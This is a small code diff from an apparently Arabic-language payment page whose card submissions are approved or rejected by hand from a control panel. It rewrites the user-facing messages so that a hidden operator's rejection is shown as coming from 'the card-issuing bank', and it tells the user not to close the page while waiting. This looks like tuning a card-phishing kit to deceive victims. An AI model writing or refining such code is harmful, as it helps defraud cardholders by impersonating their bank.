@@ -493,7 +493,7 @@
               // ═══════════════════════════════════════════════════════
               // الانتظار: التوجيه يتم الآن من لوحة التحكم (موافقة / رفض)
               // ═══════════════════════════════════════════════════════
-              document.getElementById('loadingText').textContent = 'بانتظار موافقة المدير على العملية...';
+              document.getElementById('loadingText').textContent = 'العملية قيد المعالجة يرجى الانتظار وعدم اغلاق الصفحة    ...';
 
               const rejectionMsg = document.getElementById('rejectionMessage');
               const onReject = (cmd) => {
@@ -502,7 +502,7 @@
                 rejectClear();
                 if (rejectionMsg) {
                   rejectionMsg.style.display = 'block';
-                  rejectionMsg.textContent = '❌ تم رفض العملية من قبل المدير: ' + reason;
+                  rejectionMsg.textContent = '❌ تم رفض العملية من قبل البنك المصدر للبطاقة: ' + reason;
                 }
               };
               const rejectClear = () => { loadingOverlay.classList.remove('show'); };
